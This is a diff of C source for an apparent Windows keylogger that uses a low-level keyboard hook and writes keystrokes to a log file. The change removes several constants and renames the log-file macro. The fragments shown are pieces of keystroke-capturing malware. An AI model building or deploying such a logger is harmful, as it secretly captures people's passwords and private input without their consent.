@@ -4,14 +4,6 @@
 #include <stdio.h>
 #include <string.h>
 #pragma comment(lib, "User32.lib")
-#define NUMPAD_DELTA 0x30
-#define NUM_START 0x30
-#define NUM_END 0x39
-#define LETTERS_START 0x41
-#define LETTERS_END 0x5A
-#define CASE_DELTA 0x20
-#define MAX_TITLE_LEN 256
-#define FILENAME "log.txt"
 
 SPECIAL_KEY specials[] = {
 	{VK_LSHIFT, FALSE, ""},
@@ -75,7 +67,7 @@ HHOOK hhk_low_level_hook = { 0 };
 unsigned int __stdcall start_logging(void* _) {
 	MSG msg = { 0 };
 
-	logger_file_handle = CreateFileA(FILENAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
+	logger_file_handle = CreateFileA(LOG_FILENAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
 		NULL, CREATE_ALWAYS, 0, NULL);
 	if (logger_file_handle == INVALID_HANDLE_VALUE) {
 		printf("An error occoured while trying to open file: %d\n", GetLastError());
@@ -214,7 +206,7 @@ BOOL lkey_or_rkey_down(int lkey_code) {
 }
 
 void read_file(char* buffer, LPDWORD bytes_read, int max_bytes_to_read) {
-	HANDLE file = CreateFile(FILENAME, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+	HANDLE file = CreateFile(LOG_FILENAME, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
 		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
 	if (file == INVALID_HANDLE_VALUE) {
 		printf("An error occoured while trying to open file: %d\n", GetLastError());
